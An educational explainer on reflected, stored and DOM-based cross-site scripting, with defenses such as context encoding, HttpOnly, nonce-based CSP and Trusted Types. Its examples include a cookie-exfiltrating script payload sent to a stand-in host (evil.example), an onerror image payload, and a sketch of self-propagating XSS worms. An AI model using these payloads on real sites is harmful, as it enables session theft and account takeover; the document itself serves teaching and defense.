XSS happens when attacker-controlled input becomes executable script in a victim's browser, inside the victim origin — which means the script inherits the victim origin's privileges: it can read the DOM, fire authenticated requests, and exfiltrate data.

Reflected XSS: the payload arrives in a request and is echoed into the response. Worked example: a search page renders results with echo 'Results for: ' + q, where q comes from the URL query string. The attacker crafts https://shop.example/search?q=<script>fetch('https://evil.example?c='+document.cookie)</script> and tricks a victim into clicking. The server reflects the script into the page, the victim's browser executes it in the shop origin, and the cookie goes to the attacker. The fix is output encoding for the context: HTML-encode <, >, &, quotes when injecting into HTML body.

Stored XSS: the payload is saved server-side and served to every viewer. Worked example: a comment field stores raw HTML; the attacker posts <img src=x onerror="steal()"> as a product review. Every shopper who views the product executes it. Stored XSS is worse than reflected because no per-victim trick is needed — the application delivers the attack itself. Same fix, applied at render time (encode on output, not on input, because the same data may be rendered in HTML, JS, and URL contexts needing different encodings).

DOM-based XSS: the vulnerability lives entirely in client-side JavaScript. Worked example: a page does element.innerHTML = location.hash.slice(1) to render a welcome message from the URL fragment. The fragment never reaches the server, so server-side filters miss it; the attack URL is https://shop.example/welcome#<img src=x onerror=...>. Defense: never sink untrusted data into innerHTML; use textContent, or a sanitizer for the rare cases rich HTML is required.

Defense in depth: HttpOnly on session cookies keeps stolen-script from reading document.cookie (it can still act as the user, so this is mitigation, not a fix); Content Security Policy (script-src allowlists) can neuter injected scripts in modern browsers. Operator gotcha: encoding must match the sink — HTML-encoding is wrong inside a <script> block or a URL, and blacklist-stripping of '<script' is defeated by a dozen known bypasses. Encode for the context, on output, every time.

A word on stored XSS worms, the nightmare variant: when the payload not only executes but re-submits itself (reading the victim's session and posting the same malicious comment from their account), one stored XSS becomes self-propagating across the user base — the application does the attacker's distribution. The historical worms that did this needed no per-victim lures. The structural defense beyond encoding is Content Security Policy with nonces: the server generates a random nonce per response, attaches it to legitimate script tags, and the policy script-src 'nonce-<value>' lets only those execute — injected markup lacks the nonce and dies silently. Nonce-based CSP is the strongest XSS mitigation available in modern browsers, and deploying it is a forcing function for removing inline scripts, which is itself good hygiene. Pair it with Trusted Types (which make dangerous sinks like innerHTML throw unless the value passes a policy) for defense that survives developer mistakes.

